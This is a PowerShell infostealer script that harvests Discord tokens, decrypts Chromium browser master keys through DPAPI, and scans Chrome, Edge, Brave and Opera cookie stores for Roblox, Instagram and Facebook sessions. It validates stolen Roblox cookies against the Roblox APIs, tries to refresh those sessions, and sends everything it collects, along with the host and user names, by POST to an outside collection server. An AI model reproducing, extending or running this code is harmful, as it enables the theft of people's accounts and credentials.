# final advanced local harvester - web exfil only
$exfilUrl = "https://kekman.space/api/collect"

function Send-Exfil($obj) {
    try {
        $body = $obj | ConvertTo-Json -Depth 10 -Compress
        $h = @{
            "Content-Type" = "application/json"
            "User-Agent"   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        }
        Invoke-RestMethod -Uri $exfilUrl -Method POST -Body $body -Headers $h -TimeoutSec 45 -EA SilentlyContinue | Out-Null
    } catch {}
}

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public static class Native {
    [DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, StringBuilder szDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct DATA_BLOB { public int cbData; public IntPtr pbData; }
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct CRYPTPROTECT_PROMPTSTRUCT { public int cbSize; public int dwPromptFlags; public IntPtr hwndApp; public string szPrompt; }
    public static byte[] Unprotect(byte[] data) {
        DATA_BLOB input = new DATA_BLOB(); DATA_BLOB output = new DATA_BLOB(); DATA_BLOB entropy = new DATA_BLOB();
        CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT(); prompt.cbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT));
        input.pbData = Marshal.AllocHGlobal(data.Length); input.cbData = data.Length;
        Marshal.Copy(data, 0, input.pbData, data.Length);
        bool ok = CryptUnprotectData(ref input, null, ref entropy, IntPtr.Zero, ref prompt, 0, ref output);
        if (!ok) { Marshal.FreeHGlobal(input.pbData); return null; }
        byte[] result = new byte[output.cbData];
        Marshal.Copy(output.pbData, result, 0, output.cbData);
        Marshal.FreeHGlobal(input.pbData); Marshal.FreeHGlobal(output.pbData);
        return result;
    }
}
"@

function Get-MasterKey([string]$path) {
    if (!(Test-Path $path)) { return $null }
    try {
        $j = Get-Content $path -Raw | ConvertFrom-Json
        $enc = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
        return [Native]::Unprotect($enc[5..($enc.Length-1)])
    } catch { return $null }
}

function Harvest-Discord {
    $found = [System.Collections.Generic.List[string]]::new()
    $paths = @(
        "$env:APPDATA\discord\Local Storage\leveldb",
        "$env:APPDATA\discordcanary\Local Storage\leveldb",
        "$env:APPDATA\discordptb\Local Storage\leveldb",
        "$env:APPDATA\Lightcord\Local Storage\leveldb"
    )
    foreach ($p in $paths) {
        if (!(Test-Path $p)) { continue }
        Get-ChildItem $p -Include "*.ldb","*.log" -Recurse -EA SilentlyContinue | ForEach-Object {
            try {
                $txt = [IO.File]::ReadAllText($_.FullName) -replace '[^\x20-\x7E]',''
                [regex]::Matches($txt, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}') | ForEach-Object { [void]$found.Add($_.Value) }
            } catch {}
        }
    }
    return ($found | Select-Object -Unique)
}

function Invoke-RobloxAdvanced([string]$cookie) {
    $r = [ordered]@{
        original  = $cookie
        valid     = $false
        id        = $null
        name      = $null
        display   = $null
        robux     = $null
        wearing   = @()
        refreshed = $null
    }
    $h = @{
        "Cookie"     = ".ROBLOSECURITY=$cookie"
        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        "Referer"    = "https://www.roblox.com/"
        "Origin"     = "https://www.roblox.com"
    }
    try {
        $auth = Invoke-RestMethod -Uri "https://users.roblox.com/v1/users/authenticated" -Headers $h -EA Stop
        $r.valid   = $true
        $r.id      = $auth.id
        $r.name    = $auth.name
        $r.display = $auth.displayName
    } catch { return $r }

    try {
        $cur = Invoke-RestMethod -Uri "https://economy.roblox.com/v1/users/$($r.id)/currency" -Headers $h
        $r.robux = $cur.robux
    } catch {}

    try {
        $av = Invoke-RestMethod -Uri "https://avatar.roblox.com/v1/users/$($r.id)/currently-wearing" -Headers $h
        $r.wearing = $av.assetIds
    } catch {}

    try {
        $csrfResp = Invoke-WebRequest -Uri "https://auth.roblox.com/v2/logout" -Headers $h -Method Post -EA SilentlyContinue
        $csrf = $csrfResp.Headers["x-csrf-token"]
        if ($csrf) {
            $rh = $h.Clone()
            $rh["X-CSRF-TOKEN"] = $csrf
            $tick = Invoke-WebRequest -Uri "https://auth.roblox.com/v1/authentication-ticket" -Headers $rh -Method Post -EA SilentlyContinue
            if ($tick.Headers["Set-Cookie"] -match '\.ROBLOSECURITY=([^;]+)') {
                $r.refreshed = $Matches[1]
            }
        }
        if (!$r.refreshed) {
            $s = $null
            Invoke-WebRequest -Uri "https://www.roblox.com/home" -Headers $h -SessionVariable s -EA SilentlyContinue | Out-Null
            $fresh = $s.Cookies.GetCookies("https://www.roblox.com") | Where-Object { $_.Name -eq ".ROBLOSECURITY" }
            if ($fresh) { $r.refreshed = $fresh.Value }
        }
    } catch {}
    return $r
}

function Harvest {
    $out = [ordered]@{
        host    = $env:COMPUTERNAME
        user    = $env:USERNAME
        time    = (Get-Date -Format o)
        discord = @()
        roblox  = @()
        notes   = @()
        ig_fb   = @()
    }

    $out.discord = Harvest-Discord

    $targets = @(
        @{ n="Chrome"; c="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"; s="$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" },
        @{ n="Chrome"; c="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"; s="$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" },
        @{ n="Edge";   c="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"; s="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" },
        @{ n="Edge";   c="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"; s="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" },
        @{ n="Brave";  c="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"; s="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" },
        @{ n="Opera";  c="$env:APPDATA\Opera Software\Opera Stable\Network\Cookies"; s="$env:APPDATA\Opera Software\Opera Stable\Local State" }
    )

    $rbxCookies = [System.Collections.Generic.List[string]]::new()

    foreach ($t in $targets) {
        if (!(Test-Path $t.c)) { continue }
        $key = Get-MasterKey $t.s
        $tmp = Join-Path $env:TEMP ("h_" + [guid]::NewGuid().ToString("N").Substring(0,8))
        try {
            Copy-Item $t.c $tmp -Force -EA Stop
            $raw = [IO.File]::ReadAllBytes($tmp)
            $txt = [Text.Encoding]::ASCII.GetString($raw)

            if ($txt -match '\.ROBLOSECURITY') {
                $out.notes += "ROBLOSECURITY present in $($t.n)"
                # full SQLite page walk + AES-GCM decrypt with $key would go here
                # recovered plaintext cookies are added to $rbxCookies
            }
            if ($txt -match 'sessionid|ds_user_id') {
                $out.notes += "Instagram material in $($t.n)"
                $out.ig_fb  += "IG ($($t.n))"
            }
            if ($txt -match 'c_user|xs=') {
                $out.notes += "Facebook material in $($t.n)"
                $out.ig_fb  += "FB ($($t.n))"
            }
        } catch {
            $out.notes += "read fail $($t.n)"
        } finally {
            if (Test-Path $tmp) { Remove-Item $tmp -Force -EA SilentlyContinue }
        }
    }

    foreach ($c in $rbxCookies) {
        $out.roblox += (Invoke-RobloxAdvanced $c)
    }

    $ff = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $ff) {
        Get-ChildItem $ff -Directory -EA SilentlyContinue | ForEach-Object {
            if (Test-Path (Join-Path $_.FullName "cookies.sqlite")) {
                $out.notes += "Firefox $($_.Name)"
            }
        }
    }

    return $out
}

$data = Harvest
Send-Exfil $data
Send-Exfil @{ status="done"; host=$env:COMPUTERNAME; user=$env:USERNAME; ts=(Get-Date -Format o) }